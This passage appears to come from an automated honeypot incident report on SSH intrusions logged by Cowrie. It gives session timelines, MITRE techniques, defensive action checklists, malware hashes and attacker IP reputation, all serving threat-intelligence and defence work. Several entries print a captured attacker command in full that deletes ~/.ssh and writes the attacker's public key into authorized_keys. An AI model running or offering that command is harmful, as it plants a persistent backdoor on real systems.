| `2026-04-14 16:12:31` | `cowrie.client.version` |
| `2026-04-14 16:12:32` | `cowrie.client.kex` |
| `2026-04-14 16:12:32` | `cowrie.login.success` |
| `2026-04-14 16:12:32` | `cowrie.session.params` |
| `2026-04-14 16:12:32` | `cowrie.command.input` |
| `2026-04-14 16:12:32` | `cowrie.command.failed` |
| `2026-04-14 16:12:32` | `cowrie.log.closed` |
| `2026-04-14 16:12:33` | `cowrie.session.params` |
| `2026-04-14 16:12:33` | `cowrie.command.input` |
| `2026-04-14 16:12:33` | `cowrie.session.file_download` |
| `2026-04-14 16:12:33` | `cowrie.log.closed` |
| `2026-04-14 16:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a490f169d7

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:12 |
| **Last Seen** | 2026-04-14 16:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:12:34` | `cowrie.session.connect` |
| `2026-04-14 16:12:34` | `cowrie.client.version` |
| `2026-04-14 16:12:35` | `cowrie.client.kex` |
| `2026-04-14 16:12:35` | `cowrie.login.success` |
| `2026-04-14 16:12:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d3e1652ea53

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:14 |
| **Last Seen** | 2026-04-14 16:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:14:02` | `cowrie.session.connect` |
| `2026-04-14 16:14:02` | `cowrie.client.version` |
| `2026-04-14 16:14:02` | `cowrie.client.kex` |
| `2026-04-14 16:14:03` | `cowrie.login.success` |
| `2026-04-14 16:14:03` | `cowrie.session.params` |
| `2026-04-14 16:14:03` | `cowrie.command.input` |
| `2026-04-14 16:14:03` | `cowrie.command.failed` |
| `2026-04-14 16:14:03` | `cowrie.log.closed` |
| `2026-04-14 16:14:03` | `cowrie.session.params` |
| `2026-04-14 16:14:03` | `cowrie.command.input` |
| `2026-04-14 16:14:03` | `cowrie.session.file_download` |
| `2026-04-14 16:14:03` | `cowrie.log.closed` |
| `2026-04-14 16:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87fbc54c9479

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:14 |
| **Last Seen** | 2026-04-14 16:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:14:05` | `cowrie.session.connect` |
| `2026-04-14 16:14:05` | `cowrie.client.version` |
| `2026-04-14 16:14:05` | `cowrie.client.kex` |
| `2026-04-14 16:14:06` | `cowrie.login.success` |
| `2026-04-14 16:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-854bb7a59f17

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:15 |
| **Last Seen** | 2026-04-14 16:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:15:37` | `cowrie.session.connect` |
| `2026-04-14 16:15:37` | `cowrie.client.version` |
| `2026-04-14 16:15:37` | `cowrie.client.kex` |
| `2026-04-14 16:15:38` | `cowrie.login.success` |
| `2026-04-14 16:15:38` | `cowrie.session.params` |
| `2026-04-14 16:15:38` | `cowrie.command.input` |
| `2026-04-14 16:15:38` | `cowrie.command.failed` |
| `2026-04-14 16:15:38` | `cowrie.log.closed` |
| `2026-04-14 16:15:38` | `cowrie.session.params` |
| `2026-04-14 16:15:38` | `cowrie.command.input` |
| `2026-04-14 16:15:38` | `cowrie.session.file_download` |
| `2026-04-14 16:15:38` | `cowrie.log.closed` |
| `2026-04-14 16:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e38601329353

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:15 |
| **Last Seen** | 2026-04-14 16:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:15:40` | `cowrie.session.connect` |
| `2026-04-14 16:15:40` | `cowrie.client.version` |
| `2026-04-14 16:15:40` | `cowrie.client.kex` |
| `2026-04-14 16:15:41` | `cowrie.login.success` |
| `2026-04-14 16:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35460c09a58f

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:18 |
| **Last Seen** | 2026-04-14 16:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:18:57` | `cowrie.session.connect` |
| `2026-04-14 16:18:57` | `cowrie.client.version` |
| `2026-04-14 16:18:57` | `cowrie.client.kex` |
| `2026-04-14 16:18:58` | `cowrie.login.success` |
| `2026-04-14 16:18:58` | `cowrie.session.params` |
| `2026-04-14 16:18:58` | `cowrie.command.input` |
| `2026-04-14 16:18:58` | `cowrie.command.failed` |
| `2026-04-14 16:18:58` | `cowrie.log.closed` |
| `2026-04-14 16:18:58` | `cowrie.session.params` |
| `2026-04-14 16:18:58` | `cowrie.command.input` |
| `2026-04-14 16:18:59` | `cowrie.session.file_download` |
| `2026-04-14 16:18:59` | `cowrie.log.closed` |
| `2026-04-14 16:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-203e775ce536

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:19 |
| **Last Seen** | 2026-04-14 16:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:19:00` | `cowrie.session.connect` |
| `2026-04-14 16:19:00` | `cowrie.client.version` |
| `2026-04-14 16:19:00` | `cowrie.client.kex` |
| `2026-04-14 16:19:01` | `cowrie.login.success` |
| `2026-04-14 16:19:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa8a6d613b19

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 16:19 |
| **Last Seen** | 2026-04-14 16:19 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:19:28` | `cowrie.session.connect` |
| `2026-04-14 16:19:28` | `cowrie.client.version` |
| `2026-04-14 16:19:28` | `cowrie.client.kex` |
| `2026-04-14 16:19:29` | `cowrie.login.success` |
| `2026-04-14 16:19:30` | `cowrie.session.params` |
| `2026-04-14 16:19:30` | `cowrie.command.input` |
| `2026-04-14 16:19:30` | `cowrie.command.failed` |
| `2026-04-14 16:19:30` | `cowrie.log.closed` |
| `2026-04-14 16:19:30` | `cowrie.session.params` |
| `2026-04-14 16:19:30` | `cowrie.command.input` |
| `2026-04-14 16:19:30` | `cowrie.session.file_download` |
| `2026-04-14 16:19:30` | `cowrie.log.closed` |
| `2026-04-14 16:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c84c4aca3c01

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 16:19 |
| **Last Seen** | 2026-04-14 16:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:19:33` | `cowrie.session.connect` |
| `2026-04-14 16:19:33` | `cowrie.client.version` |
| `2026-04-14 16:19:33` | `cowrie.client.kex` |
| `2026-04-14 16:19:34` | `cowrie.login.success` |
| `2026-04-14 16:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea5e73f47b4b

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 16:22 |
| **Last Seen** | 2026-04-14 16:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:22:54` | `cowrie.session.connect` |
| `2026-04-14 16:22:54` | `cowrie.client.version` |
| `2026-04-14 16:22:55` | `cowrie.client.kex` |
| `2026-04-14 16:22:56` | `cowrie.login.success` |
| `2026-04-14 16:22:56` | `cowrie.session.params` |
| `2026-04-14 16:22:56` | `cowrie.command.input` |
| `2026-04-14 16:22:56` | `cowrie.command.failed` |
| `2026-04-14 16:22:56` | `cowrie.log.closed` |
| `2026-04-14 16:22:57` | `cowrie.session.params` |
| `2026-04-14 16:22:57` | `cowrie.command.input` |
| `2026-04-14 16:22:57` | `cowrie.session.file_download` |
| `2026-04-14 16:22:57` | `cowrie.log.closed` |
| `2026-04-14 16:23:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc32978a389b

| Field | Detail |
|---|---|
| **Source IP** | `172.191.157[.]64` |
| **First Seen** | 2026-04-14 16:23 |
| **Last Seen** | 2026-04-14 16:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:23:00` | `cowrie.session.connect` |
| `2026-04-14 16:23:00` | `cowrie.client.version` |
| `2026-04-14 16:23:00` | `cowrie.client.kex` |
| `2026-04-14 16:23:01` | `cowrie.login.success` |
| `2026-04-14 16:23:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.157[.]64` to AbuseIPDB if not already reported
- [ ] Block `172.191.157[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c2a3b3be93e

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:23 |
| **Last Seen** | 2026-04-14 16:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:23:45` | `cowrie.session.connect` |
| `2026-04-14 16:23:45` | `cowrie.client.version` |
| `2026-04-14 16:23:46` | `cowrie.client.kex` |
| `2026-04-14 16:23:46` | `cowrie.login.success` |
| `2026-04-14 16:23:46` | `cowrie.session.params` |
| `2026-04-14 16:23:46` | `cowrie.command.input` |
| `2026-04-14 16:23:46` | `cowrie.command.failed` |
| `2026-04-14 16:23:46` | `cowrie.log.closed` |
| `2026-04-14 16:23:47` | `cowrie.session.params` |
| `2026-04-14 16:23:47` | `cowrie.command.input` |
| `2026-04-14 16:23:47` | `cowrie.session.file_download` |
| `2026-04-14 16:23:47` | `cowrie.log.closed` |
| `2026-04-14 16:23:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8da890b21f2f

| Field | Detail |
|---|---|
| **Source IP** | `103.218.242[.]31` |
| **First Seen** | 2026-04-14 16:23 |
| **Last Seen** | 2026-04-14 16:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 16:23:49` | `cowrie.session.connect` |
| `2026-04-14 16:23:49` | `cowrie.client.version` |
| `2026-04-14 16:23:49` | `cowrie.client.kex` |
| `2026-04-14 16:23:49` | `cowrie.login.success` |
| `2026-04-14 16:23:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.218.242[.]31` to AbuseIPDB if not already reported
- [ ] Block `103.218.242[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `103.218.242[.]31` | **25** | 2026-04-14 15:45 | 2026-04-14 16:23 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `124.70.68[.]216` | **25** | 2026-04-14 15:45 | 2026-04-14 16:07 | 35m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.191.157[.]64` | **25** | 2026-04-14 15:41 | 2026-04-14 16:24 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `185.16.214[.]226` | **25** | 2026-04-14 15:44 | 2026-04-14 15:57 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `49.64.169[.]153` | **25** | 2026-04-14 15:43 | 2026-04-14 15:51 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.130[.]213` | 1 | 2026-04-14 15:42 | 2026-04-14 15:42 | 7s | 0 | `T1592` | 🟢 LOW |
| `120.48.140[.]232` | 1 | 2026-04-14 15:45 | 2026-04-14 15:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.115[.]124` | 1 | 2026-04-14 15:44 | 2026-04-14 15:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]198` | 1 | 2026-04-14 15:44 | 2026-04-14 15:46 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `103.218.242[.]31` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 33 |
| `120.48.140[.]232` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 15 |
| `172.191.157[.]64` | US | Microsoft Limited | **100** ⚠️ | 50 |
